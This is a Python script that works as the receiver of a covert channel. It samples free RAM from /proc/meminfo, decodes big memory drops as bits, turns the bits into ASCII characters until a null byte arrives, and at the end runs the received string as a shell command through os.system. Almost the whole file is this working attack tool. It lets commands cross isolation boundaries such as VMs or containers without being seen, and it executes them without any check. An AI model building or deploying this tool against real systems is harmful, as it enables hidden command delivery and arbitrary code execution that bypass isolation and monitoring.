#!/usr/bin/python
# Written by Yehudacorsia@gmail.com

import sys
import time
import binascii
import os
import datetime
import logging

# Globals

TIMES_TO_TAKE_SAMPLES = 5  # how much times to check used ram.

TIME_TO_TAKE_SAMPLE = 1  # how much time need wait between take more samples in one receive.
TIME_BETWEEN_SEND = TIMES_TO_TAKE_SAMPLES * TIME_TO_TAKE_SAMPLE

# because can have more things that ran in host, we check if have this difference in used ram.
DIFFERENCE_INDICATE_TRANSFER_IN_KB = 200000  # get used ram return in KB so this also in KB.

NULL_ASCII_BIN_STR = "00000000"  # This indicate end of receiving.
SIZE_BYTE_IN_BINARY = 8
MEGABYTE = 2 ** 20  # 1048576

pre_average_free_ram = 0  # Global variable for holding the average used ram.

##############################################################################
# Log config.
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

formatter = logging.Formatter("%(asctime)s:%(name)s:%(message)s")

log_file_handler = logging.FileHandler("receiver.log", mode="a")
log_file_handler.setFormatter(formatter)

logger.addHandler(log_file_handler)

stdout_handler = logging.StreamHandler(sys.stdout)
stdout_formatter = logging.Formatter("%(message)s")
stdout_handler.setFormatter("")
stdout_handler.setLevel(logging.INFO)

logger.addHandler(stdout_handler)


##############################################################################


def get_free_ram():
    """
    This func return the free ram in KB.
    its take this from file /proc/meminfo
    """
    with open('/proc/meminfo', 'r') as mem:
        lines = mem.readlines()

    """
    /proc/meminfo might look like :

    MemTotal:       16302032 kB
    MemFree:          494744 kB
    MemAvailable:    1441036 kB
    ...
    ...
    ...

    so we just taking the second line, and getting only the number.

    """
    return int(lines[1].split()[1])


def get_average_free_ram():
    list_free_ram = list()
    for i in range(TIMES_TO_TAKE_SAMPLES):
        time.sleep(TIME_TO_SLEEP_BETWEEN_SAMPLES)
        list_free_ram.append(get_free_ram())

    # Return the average of list.
    return sum(list_free_ram) / len(list_free_ram)


def check_if_transform_data():
    curr_avg = get_average_free_ram()
    global pre_average_free_ram

    # because we want log this in one line we just creating the string and log it after.
    string_to_log = "{} : ".format(datetime.datetime.now())
    # because sometimes length of free ram is not like the other len we format it to full it by whitespaces.
    string_to_log += "Free ram is: {:9d} receive: ".format(curr_avg)

    if (pre_average_free_ram - curr_avg) > DIFFERENCE_INDICATE_TRANSFER_IN_KB:
        logger.info("{} {}".format(string_to_log, "1"))
        return "1"
    else:
        # keep track of the current ram average.
        # so that we can calculate the current ram changes according to the updated average.
        pre_average_free_ram = curr_avg
        logger.info("{} {}".format(string_to_log, "0"))
        return "0"


# When take samples, need sleep between samples.
# todo: change to something like:  TIME_TO_TAKE_SAMPLE - (TIME_IT_GET_AVG_FREE_RAM_IN_SECONDS / TIMES_TO_TAKE_SAMPLES)
TIME_TO_SLEEP_BETWEEN_SAMPLES = 1


def main():
    global pre_average_free_ram
    full_receive_string = ""

    logger.info("Time to sleep between samples: {}".format(TIME_TO_SLEEP_BETWEEN_SAMPLES))
    logger.info("Will wait {} seconds between each bit.".format(TIMES_TO_TAKE_SAMPLES))
    logger.info("Getting the average free ram...")
    pre_average_free_ram = get_average_free_ram()
    logger.info("The average free ram is {}".format(pre_average_free_ram))

    raw_input("Press Enter to start receiving...\n")
    logger.info("Synchronize bit window time (wait until host second % 20 == 0)")
    while datetime.datetime.now().second % 20 != 0:
        time.sleep(0.1)

    need_get_more_binary = True
    while need_get_more_binary:
        curr_binary_string = ""
        for i in range(SIZE_BYTE_IN_BINARY):
            curr_binary_string += check_if_transform_data()

        logger.info("curr binary string is: {}".format(curr_binary_string))

        if curr_binary_string == NULL_ASCII_BIN_STR:
            logger.info("get null, so finish transfer.")
            need_get_more_binary = False
        else:
            n = int(curr_binary_string, 2)
            logger.info("full receive string now is : '{}' and will be appended by '{}'".format(full_receive_string,
                                                                                                binascii.unhexlify(
                                                                                                    '%x' % n)))
            full_receive_string += binascii.unhexlify('%x' % n)
            logger.info(full_receive_string)

    logger.info("Receiving : {}\n".format(full_receive_string))
    logger.info("Running it as a command...")
    os.system(full_receive_string)

    logger.info("\nFINISH")


if __name__ == '__main__':
    main()
